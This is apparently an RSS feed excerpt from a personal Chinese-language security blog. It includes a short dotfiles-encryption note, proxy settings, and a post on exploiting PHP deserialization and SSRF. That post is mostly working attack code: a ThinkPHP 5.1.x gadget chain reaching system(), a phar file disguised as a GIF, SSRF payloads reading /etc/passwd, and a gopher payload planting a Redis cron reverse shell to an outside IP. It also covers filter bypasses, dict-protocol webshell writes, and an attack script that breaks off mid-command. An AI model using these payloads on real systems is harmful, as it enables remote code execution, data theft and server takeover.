&lt;p>First thing you need to do is, create a separate directory to store those secret files and initialize
it as a private git repository on your github account. In my case, I created a directory in my home
directory named &lt;strong>~/.secrets/data&lt;/strong>.&lt;/p>
&lt;p>Then use &lt;strong>gpg&lt;/strong> command encrypt your secret files into &lt;strong>~/.secrets/data&lt;/strong>, after that you can push it
to remote. When you need those files to be up to date in other host, you can checkout this private
repository. (the best way is made this repository as a submodule of your dotfiles repository.) use
&lt;strong>gpg&lt;/strong> to decrypt secret files back into their original location.&lt;/p>
&lt;p>I have written two scripts named &lt;code>encrypt.sh&lt;/code> and &lt;code>decrypt.sh&lt;/code> (can be found
in &lt;a href="https://github.com/codiy1992/dotfiles/tree/master/.secrets">my dotfiles repository&lt;/a>) to automatically compelte this process&lt;/p>
&lt;p>That&amp;rsquo;s all. you can easily manage your dotfiles in a happy way.&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.archlinux.org/title/Dotfiles">https://wiki.archlinux.org/title/Dotfiles&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docs: Proxy Setting</title><link>https://note.codiy.net/docs/2021/03/proxy-setting/</link><pubDate>Wed, 10 Mar 2021 09:23:01 +0800</pubDate><guid>https://note.codiy.net/docs/2021/03/proxy-setting/</guid><description>
&lt;p>详细参考: &lt;a href="https://about.gitlab.com/blog/2021/01/27/we-need-to-talk-no-proxy/">https://about.gitlab.com/blog/2021/01/27/we-need-to-talk-no-proxy/&lt;/a>&lt;/p>
&lt;h2 id="http_proxy-and-https_proxy">&lt;code>http_proxy&lt;/code> and &lt;code>https_proxy&lt;/code>&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>小写格式&lt;/strong>总是被支持的, &lt;strong>大写格式&lt;/strong>不一定被支持&lt;/li>
&lt;/ul>
&lt;h2 id="no_proxy">&lt;code>no_proxy&lt;/code>&lt;/h2>
&lt;ul>
&lt;li>使用小写格式&lt;/li>
&lt;li>可以使用 &lt;code>hostname:port&lt;/code> 的格式&lt;/li>
&lt;li>使用域名后缀匹配(e.g. &lt;code>example.com&lt;/code> 会匹配 &lt;code>test.example.com&lt;/code>)&lt;/li>
&lt;li>要匹配顶级域名,需避免在域名前面有&lt;code>.&lt;/code>号&lt;/li>
&lt;li>避免使用&lt;strong>CIDR格式&lt;/strong>, 因为只有 Go 和 Ruby 支持.&lt;/li>
&lt;li>腾讯云需设置 &lt;code>export no_proxy=mirrors.tencentyun.com&lt;/code> 否则无法使用 &lt;code>yum&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="ssh-代理设置">ssh 代理设置&lt;/h2>
&lt;ul>
&lt;li>安装依赖程序 &lt;code>sudo yum install nmap&lt;/code> or &lt;code>sudo apt-get install nmap&lt;/code>&lt;/li>
&lt;li>编辑 &lt;code>~/.ssh/config&lt;/code> 添加如下配置&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">Host github.com
HostName github.com
ProxyCommand /usr/bin/ncat --proxy 127.0.0.1:7091 --proxy-type socks5 %h %p
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Docs: Exploiting PHP deserialization And SSRF</title><link>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</link><pubDate>Sat, 27 Feb 2021 09:16:52 +0800</pubDate><guid>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</guid><description>
&lt;h2 id="1---反序列化利用链">1 - 反序列化利用链&lt;/h2>
&lt;h3 id="11-基础知识和原理">1.1 基础知识和原理&lt;/h3>
&lt;ul>
&lt;li>反序列化会从给定的&lt;strong>序列化串&lt;/strong>来还原对象,并调用 &lt;code>__wakeup&lt;/code> 来做唤醒工作, 而不调用 &lt;code>__construct&lt;/code> 来初始化对象&lt;/li>
&lt;li>还原的对象会带上序列化时指定的属性, 这部分可被利用来作为&lt;strong>恶意代码输入点&lt;/strong>.&lt;/li>
&lt;li>恶意代码仅放在属性中并不会被执行, 所以一般利用 &lt;code>__destruct&lt;/code> 在对象销毁的时候,通过巧妙构造传递属性来让恶意代码被执行, 这中间可能还需要借助其他类对象.&lt;/li>
&lt;li>因此, 只要存在受用户控制的&lt;strong>反序列化入口&lt;/strong>, 即可通过特别构造的&lt;strong>序列化串&lt;/strong>来达到搞事情的目的.&lt;/li>
&lt;/ul>
&lt;h3 id="12-利用形式反序列化入口">1.2 利用形式(反序列化入口)&lt;/h3>
&lt;ul>
&lt;li>直接调用反序列化函数, &lt;code>unserialize(base64_decode($_POST['serialized_string']));&lt;/code>&lt;/li>
&lt;li>下列函数在载入&lt;code>phar&lt;/code> 时候也会触发反序列化, 如 &lt;code>is_dir('phar://phar.gif')&lt;/code>&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>column1&lt;/th>
&lt;th>column2&lt;/th>
&lt;th>column3&lt;/th>
&lt;th>column4&lt;/th>
&lt;th>column5&lt;/th>
&lt;th>column6&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>fileatime&lt;/td>
&lt;td>filectime&lt;/td>
&lt;td>filemtime&lt;/td>
&lt;td>file_exists&lt;/td>
&lt;td>file_get_contents&lt;/td>
&lt;td>file_put_contents&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>file&lt;/td>
&lt;td>filegroup&lt;/td>
&lt;td>fopen&lt;/td>
&lt;td>fileinode&lt;/td>
&lt;td>fileowner&lt;/td>
&lt;td>fileperms&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>is_dir&lt;/td>
&lt;td>is_file&lt;/td>
&lt;td>is_link&lt;/td>
&lt;td>is_executable&lt;/td>
&lt;td>is_readable&lt;/td>
&lt;td>is_writeable&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>is_wirtble&lt;/td>
&lt;td>parse_ini_file&lt;/td>
&lt;td>copy&lt;/td>
&lt;td>unlink&lt;/td>
&lt;td>stat&lt;/td>
&lt;td>readfile&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>&lt;code>phar&lt;/code> 文件本地生成需 &lt;code>php.ini&lt;/code> 设置 &lt;code>phar.readonly = 0&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="13-利用链">1.3 利用链&lt;/h3>
&lt;ul>
&lt;li>常见起点&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">__wakeup &lt;span style="color:#228b22">// 一定会调用, 反序列化为对象时
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__destruct &lt;span style="color:#228b22">// 一定会调用, 对象被销毁时
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__toString &lt;span style="color:#228b22">// 当一个对象被反序列化后又被当做字符串使用
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>常见中间跳板&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">__toString &lt;span style="color:#228b22">// 当一个对象被当做字符串使用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__get &lt;span style="color:#228b22">// 读取不可访问或不存在属性时被调用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__set &lt;span style="color:#228b22">// 当给不可访问或不存在属性赋值时被调用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__isset &lt;span style="color:#228b22">// 对不可访问或不存在的属性调用isset()或empty()时被调用
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>常见终点&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">__call &lt;span style="color:#228b22">// 调用不可访问或不存在的方法时被调用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
call_user_func &lt;span style="color:#228b22">// 一般php代码执行都会选择这里
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
call_user_func_array &lt;span style="color:#228b22">// 一般php代码执行都会选择这里
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
&lt;span style="color:#00688b">$closure&lt;/span>(&lt;span style="color:#00688b">$value&lt;/span>, &lt;span style="color:#00688b">$params&lt;/span>); &lt;span style="color:#228b22">//
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="14-生成-phar-文件">1.4 生成 &lt;code>phar&lt;/code> 文件&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">@unlink(&lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> \Phar(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">startBuffering&lt;/span>();
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setStub&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;GIF89a&amp;#34;&lt;/span>.&lt;span style="color:#cd5555">&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span>); &lt;span style="color:#228b22">//设置stub
&lt;/span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#00688b">$o&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> Xxxx(); &lt;span style="color:#228b22">// 要序列化的对象
&lt;/span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setMetadata&lt;/span>(&lt;span style="color:#00688b">$o&lt;/span>); &lt;span style="color:#228b22">//将自定义meta-data存入manifest
&lt;/span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">addFromString&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;test.txt&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;test&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">stopBuffering&lt;/span>();
rename(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="15-thinkphp-51x-版本反序列化利用链httpsnikoeurusgithubio20191231thinkphp2051xe58f8de5ba8fe58897e58c96">1.5 &lt;a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp 5.1.x 版本反序列化利用链&lt;/a>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&amp;lt;?php
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think\process\pipes{
&lt;span style="color:#8b008b;font-weight:bold">class&lt;/span> &lt;span style="color:#008b45;font-weight:bold">Windows&lt;/span>
{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$files&lt;/span> = [];
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think\model\concern{
&lt;span style="color:#8b008b;font-weight:bold">trait&lt;/span> Conversion
{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$visible&lt;/span> = [];
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$relation&lt;/span> = [];
}
&lt;span style="color:#8b008b;font-weight:bold">trait&lt;/span> Attribute
{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$data&lt;/span> = [];
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$withAttr&lt;/span> = [];
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think{
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> think\model\concern\Conversion;
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> think\model\concern\Attribute;
&lt;span style="color:#8b008b;font-weight:bold">abstract&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">class&lt;/span> &lt;span style="color:#008b45;font-weight:bold">Model&lt;/span>
{
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> Conversion;
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> Attribute;
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> __construct(&lt;span style="color:#00688b">$relation&lt;/span>=[],&lt;span style="color:#00688b">$visible&lt;/span>=[],&lt;span style="color:#00688b">$data&lt;/span>=[],&lt;span style="color:#00688b">$withAttr&lt;/span>=[])
{
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">relation&lt;/span> = &lt;span style="color:#00688b">$relation&lt;/span>;
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">visible&lt;/span> = &lt;span style="color:#00688b">$visible&lt;/span>;
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">data&lt;/span> = &lt;span style="color:#00688b">$data&lt;/span>;
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">withAttr&lt;/span> = &lt;span style="color:#00688b">$withAttr&lt;/span>;
}
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think\model{
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> think\Model;
&lt;span style="color:#8b008b;font-weight:bold">class&lt;/span> &lt;span style="color:#008b45;font-weight:bold">Pivot&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">extends&lt;/span> Model{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> __construct(&lt;span style="color:#00688b">$relation&lt;/span>=[],&lt;span style="color:#00688b">$visible&lt;/span>=[],&lt;span style="color:#00688b">$data&lt;/span>=[],&lt;span style="color:#00688b">$withAttr&lt;/span>=[])
{
&lt;span style="color:#8b008b;font-weight:bold">parent&lt;/span>::&lt;span style="color:#658b00">__construct&lt;/span>(&lt;span style="color:#00688b">$relation&lt;/span>,&lt;span style="color:#00688b">$visible&lt;/span>,&lt;span style="color:#00688b">$data&lt;/span>,&lt;span style="color:#00688b">$withAttr&lt;/span>);
}
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> {
&lt;span style="color:#00688b">$relation&lt;/span> = [];
&lt;span style="color:#00688b">$visible&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">array&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;abc&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$data&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">array&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;abc&amp;#34;&lt;/span> =&amp;gt; &lt;span style="color:#cd5555">&amp;#34;echo &amp;#39;hacked&amp;#39; &amp;gt; ./uploads/hacked.txt&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$withAttr&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">array&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;abc&amp;#34;&lt;/span>=&amp;gt;&lt;span style="color:#cd5555">&amp;#34;system&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$pivot&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> think\model\Pivot(&lt;span style="color:#00688b">$relation&lt;/span>,&lt;span style="color:#00688b">$visible&lt;/span>,&lt;span style="color:#00688b">$data&lt;/span>,&lt;span style="color:#00688b">$withAttr&lt;/span>);
&lt;span style="color:#00688b">$windows&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> think\process\pipes\Windows();
&lt;span style="color:#00688b">$windows&lt;/span>-&amp;gt;&lt;span style="color:#658b00">files&lt;/span> = [&lt;span style="color:#00688b">$pivot&lt;/span>];
&lt;span style="color:#228b22">// 形式一: 直接序列化
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#228b22">// echo base64_encode(serialize($windows));
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
&lt;span style="color:#228b22">// 形式二: 序列化后存入 phar 的 Metadata
&lt;/span>&lt;span style="color:#228b22">&lt;/span> @unlink(&lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> \Phar(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">startBuffering&lt;/span>();
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setStub&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;GIF89a&amp;#34;&lt;/span>.&lt;span style="color:#cd5555">&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span>); &lt;span style="color:#228b22">//设置stub
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setMetadata&lt;/span>(&lt;span style="color:#00688b">$windows&lt;/span>); &lt;span style="color:#228b22">//将自定义meta-data存入manifest
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">addFromString&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;test.txt&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;test&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">stopBuffering&lt;/span>();
rename(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="16-如何规避">1.6 如何规避&lt;/h3>
&lt;ul>
&lt;li>杜绝反序列化利用链的存在&lt;/li>
&lt;li>任何函数调用, 特别是 1.2 中列举的函数, 应避免直接接收用户输入&lt;/li>
&lt;/ul>
&lt;h2 id="2---ssrf漏洞">2 - SSRF漏洞&lt;/h2>
&lt;blockquote>
&lt;p>参考1: &lt;a href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665&lt;/a>
参考2: &lt;a href="https://xz.aliyun.com/t/8613">https://xz.aliyun.com/t/8613&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/security/2021-02/ssrf.png"
alt=""
/>
&lt;/p>&lt;/p>
&lt;p>&lt;code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞&lt;/code>&lt;/p>
&lt;h3 id="21-ssrf漏洞示例代码">2.1 ssrf漏洞示例代码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&amp;lt;?php
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (isset(&lt;span style="color:#00688b">$_POST&lt;/span>[&lt;span style="color:#cd5555">&amp;#39;url&amp;#39;&lt;/span>])){
&lt;span style="color:#00688b">$link&lt;/span> = &lt;span style="color:#00688b">$_POST&lt;/span>[&lt;span style="color:#cd5555">&amp;#39;url&amp;#39;&lt;/span>];
&lt;span style="color:#00688b">$curlobj&lt;/span> = curl_init();
curl_setopt(&lt;span style="color:#00688b">$curlobj&lt;/span>, CURLOPT_POST, &lt;span style="color:#b452cd">0&lt;/span>);
curl_setopt(&lt;span style="color:#00688b">$curlobj&lt;/span>,CURLOPT_URL,&lt;span style="color:#00688b">$link&lt;/span>);
curl_setopt(&lt;span style="color:#00688b">$curlobj&lt;/span>, CURLOPT_RETURNTRANSFER, &lt;span style="color:#b452cd">1&lt;/span>);
&lt;span style="color:#00688b">$result&lt;/span>=curl_exec(&lt;span style="color:#00688b">$curlobj&lt;/span>);
curl_close(&lt;span style="color:#00688b">$curlobj&lt;/span>);
&lt;span style="color:#00688b">$filename&lt;/span> = &lt;span style="color:#cd5555">&amp;#39;./curled/&amp;#39;&lt;/span>.rand().&lt;span style="color:#cd5555">&amp;#39;.txt&amp;#39;&lt;/span>;
file_put_contents(&lt;span style="color:#00688b">$filename&lt;/span>, &lt;span style="color:#00688b">$result&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">echo&lt;/span> &lt;span style="color:#00688b">$result&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="22-ssrf-利用协议">2.2 ssrf 利用协议&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>file&lt;/code>： 在有回显的情况下，利用 file 协议可以读取任意内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#228b22"># 示例&lt;/span>
curl -vvv &lt;span style="color:#cd5555">&amp;#39;file:///etc/passwd&amp;#39;&lt;/span>
curl -v &lt;span style="color:#cd5555">&amp;#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>dict&lt;/code>：泄露安装软件版本信息，查看端口，操作内网redis服务等&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#228b22"># 示例&lt;/span>
curl -v &lt;span style="color:#cd5555">&amp;#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:6379/flushall&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>gopher&lt;/code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#228b22">#示例&lt;/span>
curl -v &lt;span style="color:#cd5555">&amp;#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>http/s&lt;/code>：探测内网主机存活&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="23-ssrf-绕过方法">2.3 ssrf 绕过方法&lt;/h3>
&lt;ul>
&lt;li>利用 @&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>http://abc@127.0.0.1
实际上是以用户名abc连接到站点127.0.0.1，同理
http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>http://www.aaa.com@www.bbb.com@www.ccc.com
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>利用[::] &lt;code>http://[::]:80/&lt;/code> &amp;raquo;&amp;gt; &lt;code>http://127.0.0.1&lt;/code>&lt;/li>
&lt;li>添加端口号 &lt;code>http://127.0.0.1:8080&lt;/code>&lt;/li>
&lt;li>利用短网址&lt;/li>
&lt;li>利用特殊域名,如&lt;code>127.0.0.1.xip.io&lt;/code>，可解析为&lt;code>127.0.0.1&lt;/code>&lt;/li>
&lt;li>利用DNS解析&lt;/li>
&lt;li>利用进制转换
&lt;pre tabindex="0">&lt;code>127.0.0.1 // 正常模式
0177.0.0.1 // 8进制
0x7f.0.0.1 // 16进制
2130706433 // 10进制
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>句号 &lt;code>127。0。0。1&lt;/code> &amp;raquo;&amp;gt; &lt;code>127.0.0.1&lt;/code>&lt;/li>
&lt;li>302跳转 &lt;code>可使用https://tinyurl.com生成302跳转地址&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="24-dict协议攻击redis为例">2.4 dict协议(攻击redis为例)&lt;/h3>
&lt;ul>
&lt;li>基本信息: &lt;code>dict://127.0.0.1:6379/info&lt;/code>&lt;/li>
&lt;li>清空redis: &lt;code>dict://127.0.1:6379/flushall&lt;/code>&lt;/li>
&lt;li>设置键值对 &lt;code>dict://127.0.0.1:6379/set:webshell:&amp;quot;xxxxx&amp;quot;&lt;/code>
&lt;blockquote>
&lt;p>若字符串中有空格需要将完整字符串用双引号&amp;quot;包起来, 若字符串中带有 ? 等特殊字符, 可转化为十六进制形式&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>ascii文本转hex &lt;code>ascii2hex '&amp;lt;?php phpinfo();?&amp;gt;'&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#658b00">alias&lt;/span> &lt;span style="color:#00688b">ascii2hex&lt;/span>=&lt;span style="color:#cd5555">&amp;#39;_func(){echo &amp;#34;$1&amp;#34; | hexdump -vC | awk &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;BEGIN {IFS=&amp;#34;\t&amp;#34;} {$1=&amp;#34;&amp;#34;; print }&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39; | awk &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;{sub(/\|.*/,&amp;#34;&amp;#34;)}1&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39; | tr -d &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;\n&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;|sed &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;s/ / /g&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39; |sed &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;s/ /\\x/g&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;|rev|cut -c 3- |rev }; _func&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>攻击脚本 &lt;code>dict.sh&lt;/code>, 某网站暴露ssrf漏洞参数 &lt;code>reply_image&lt;/code>, 如下脚本通过多次 post, 通过 dict, 攻击 redis 写入一句话脚本&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#1e889b">#!/bin/bash
&lt;/span>&lt;span style="color:#1e889b">&lt;/span>curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
